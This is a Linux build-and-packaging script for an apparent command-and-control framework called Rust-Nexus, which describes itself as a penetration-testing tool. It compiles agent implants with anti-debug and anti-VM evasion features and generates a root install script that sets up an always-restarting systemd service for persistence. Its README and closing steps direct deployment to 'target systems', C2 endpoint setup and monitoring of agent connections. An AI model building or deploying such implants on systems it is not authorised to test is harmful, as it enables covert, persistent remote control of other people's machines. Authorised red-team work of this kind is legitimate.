#!/bin/bash

# Linux-specific Build Script for Rust-Nexus
# Builds Linux agents with optimized configurations

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}🐧 Building Rust-Nexus for Linux Platforms${NC}"
echo "============================================="

# Configuration
OUTPUT_DIR="target/builds"
CONFIG_DIR="config"

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Check for Linux agent configuration
if [ ! -f "${CONFIG_DIR}/agent-linux.toml" ]; then
    echo -e "${RED}❌ Linux agent configuration not found: ${CONFIG_DIR}/agent-linux.toml${NC}"
    exit 1
fi

echo -e "${GREEN}✅ Linux agent configuration found${NC}"

# Linux targets
LINUX_TARGETS=(
    "x86_64-unknown-linux-gnu"
    "aarch64-unknown-linux-gnu"
    "armv7-unknown-linux-gnueabihf"
)

# Check available targets
AVAILABLE_TARGETS=()
for target in "${LINUX_TARGETS[@]}"; do
    if rustup target list --installed | grep -q "$target"; then
        AVAILABLE_TARGETS+=("$target")
        echo -e "${GREEN}✅ Target available: $target${NC}"
    else
        echo -e "${YELLOW}⚠️  Target not installed: $target${NC}"
        echo "   Install with: rustup target add $target"
    fi
done

if [ ${#AVAILABLE_TARGETS[@]} -eq 0 ]; then
    echo -e "${RED}❌ No Linux targets available for cross-compilation${NC}"
    echo "Install at least one target with: rustup target add x86_64-unknown-linux-gnu"
    exit 1
fi

# Build function for Linux
build_linux_agent() {
    local target="$1"
    local arch="${target%%-*}"

    echo -e "${BLUE}🔧 Building Linux agent for $target...${NC}"
    cd nexus-agent

    # Linux-specific features
    local features="--features linux-specific,elf-loading,systemd-integration,anti-debug,anti-vm"

    # Build command
    local build_cmd="cargo build --release --target $target $features"

    echo "Executing: $build_cmd"
    if eval "$build_cmd"; then
        echo -e "${GREEN}✅ Successfully built Linux agent for $target${NC}"

        # Copy binary with descriptive name
        local binary_name="nexus-agent-linux-${arch}"
        cp "target/${target}/release/nexus-agent" "../${OUTPUT_DIR}/${binary_name}"
        chmod +x "../${OUTPUT_DIR}/${binary_name}"

        # Copy configuration
        cp "../${CONFIG_DIR}/agent-linux.toml" "../${OUTPUT_DIR}/agent-linux-${arch}.toml"

        echo -e "${BLUE}📦 Created: ${OUTPUT_DIR}/${binary_name}${NC}"
        echo -e "${BLUE}📄 Config: ${OUTPUT_DIR}/agent-linux-${arch}.toml${NC}"

        return 0
    else
        echo -e "${RED}❌ Failed to build Linux agent for $target${NC}"
        return 1
    fi

    cd ..
}

# Build server
echo -e "${BLUE}🔧 Building nexus-server...${NC}"
cd nexus-server
if cargo build --release; then
    echo -e "${GREEN}✅ Successfully built nexus-server${NC}"
    cp target/release/nexus-server "../${OUTPUT_DIR}/nexus-server-linux"
    chmod +x "../${OUTPUT_DIR}/nexus-server-linux"
else
    echo -e "${RED}❌ Failed to build nexus-server${NC}"
    exit 1
fi
cd ..

# Build agents for all available targets
success_count=0
total_targets=${#AVAILABLE_TARGETS[@]}

for target in "${AVAILABLE_TARGETS[@]}"; do
    if build_linux_agent "$target"; then
        ((success_count++))
    fi
done

# Create deployment package
echo -e "${BLUE}📦 Creating Linux deployment package...${NC}"
PACKAGE_NAME="nexus-linux-$(date +%Y%m%d_%H%M%S)"
PACKAGE_DIR="${OUTPUT_DIR}/${PACKAGE_NAME}"
mkdir -p "$PACKAGE_DIR"

# Copy all Linux binaries and configs
cp "${OUTPUT_DIR}"/nexus-agent-linux-* "$PACKAGE_DIR/" 2>/dev/null || true
cp "${OUTPUT_DIR}"/agent-linux-*.toml "$PACKAGE_DIR/" 2>/dev/null || true
cp "${OUTPUT_DIR}/nexus-server-linux" "$PACKAGE_DIR/" 2>/dev/null || true

# Create installation script
cat > "${PACKAGE_DIR}/install.sh" << 'EOF'
#!/bin/bash

# Nexus Linux Installation Script

set -e

INSTALL_DIR="/opt/nexus"
SERVICE_NAME="nexus-agent"

echo "Installing Nexus Agent for Linux..."

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root (use sudo)"
    exit 1
fi

# Detect architecture
ARCH=$(uname -m)
case $ARCH in
    x86_64)
        BINARY="nexus-agent-linux-x86_64"
        CONFIG="agent-linux-x86_64.toml"
        ;;
    aarch64)
        BINARY="nexus-agent-linux-aarch64"
        CONFIG="agent-linux-aarch64.toml"
        ;;
    armv7l)
        BINARY="nexus-agent-linux-armv7"
        CONFIG="agent-linux-armv7.toml"
        ;;
    *)
        echo "Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

# Check if binary exists
if [ ! -f "$BINARY" ]; then
    echo "Binary not found for architecture $ARCH: $BINARY"
    exit 1
fi

# Create installation directory
mkdir -p "$INSTALL_DIR"

# Copy binary and config
cp "$BINARY" "$INSTALL_DIR/nexus-agent"
cp "$CONFIG" "$INSTALL_DIR/agent.toml"
chmod +x "$INSTALL_DIR/nexus-agent"

# Create systemd service
cat > "/etc/systemd/system/${SERVICE_NAME}.service" << SYSTEMD_EOF
[Unit]
Description=Nexus Agent
After=network.target

[Service]
Type=simple
User=root
ExecStart=$INSTALL_DIR/nexus-agent --config $INSTALL_DIR/agent.toml
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
SYSTEMD_EOF

# Enable and start service
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl start "$SERVICE_NAME"

echo "Nexus Agent installed and started successfully!"
echo "Status: systemctl status $SERVICE_NAME"
echo "Logs: journalctl -u $SERVICE_NAME -f"
EOF

chmod +x "${PACKAGE_DIR}/install.sh"

# Create README
cat > "${PACKAGE_DIR}/README.md" << EOF
# Nexus Linux Deployment Package

This package contains pre-compiled Nexus agents for Linux platforms.

## Contents

- \`nexus-agent-linux-*\`: Agent binaries for different architectures
- \`agent-linux-*.toml\`: Platform-specific configuration files
- \`nexus-server-linux\`: Server binary (if included)
- \`install.sh\`: Automated installation script

## Quick Installation

1. Run the installation script as root:
   \`\`\`bash
   sudo ./install.sh
   \`\`\`

2. The script will:
   - Detect your system architecture
   - Install the appropriate binary
   - Create a systemd service
   - Start the agent automatically

## Manual Installation

1. Choose the appropriate binary for your architecture:
   - \`nexus-agent-linux-x86_64\`: Intel/AMD 64-bit
   - \`nexus-agent-linux-aarch64\`: ARM 64-bit
   - \`nexus-agent-linux-armv7\`: ARM 32-bit

2. Copy to your preferred location:
   \`\`\`bash
   sudo cp nexus-agent-linux-x86_64 /opt/nexus/nexus-agent
   sudo cp agent-linux-x86_64.toml /opt/nexus/agent.toml
   \`\`\`

3. Configure the agent by editing the configuration file
4. Set up persistence mechanism (systemd service, cron, etc.)

## Configuration

Edit the configuration file to match your environment:
- Update C2 server endpoints
- Configure persistence methods
- Adjust evasion settings
- Set performance limits

## Security Notes

- This is a penetration testing framework
- Only use on authorized systems
- Follow all applicable laws and regulations
- Ensure proper operational security
EOF

# Create archive
cd "$OUTPUT_DIR"
tar -czf "${PACKAGE_NAME}.tar.gz" "$PACKAGE_NAME"
echo -e "${GREEN}📦 Created deployment package: ${OUTPUT_DIR}/${PACKAGE_NAME}.tar.gz${NC}"

# Summary
echo ""
echo -e "${GREEN}🎉 Linux build completed!${NC}"
echo -e "${BLUE}📊 Build Summary:${NC}"
echo "  Successfully built: $success_count/$total_targets targets"
echo "  Output directory: $OUTPUT_DIR"
echo "  Deployment package: ${PACKAGE_NAME}.tar.gz"
echo ""
echo -e "${BLUE}📋 Available binaries:${NC}"
ls -la "${OUTPUT_DIR}"/nexus-agent-linux-* 2>/dev/null || echo "  No binaries found"
echo ""
echo -e "${YELLOW}📋 Next steps:${NC}"
echo "1. Deploy the package to target Linux systems"
echo "2. Configure C2 server endpoints in the .toml files"
echo "3. Run the installation script on target systems"
echo "4. Monitor agent connections on your C2 server"
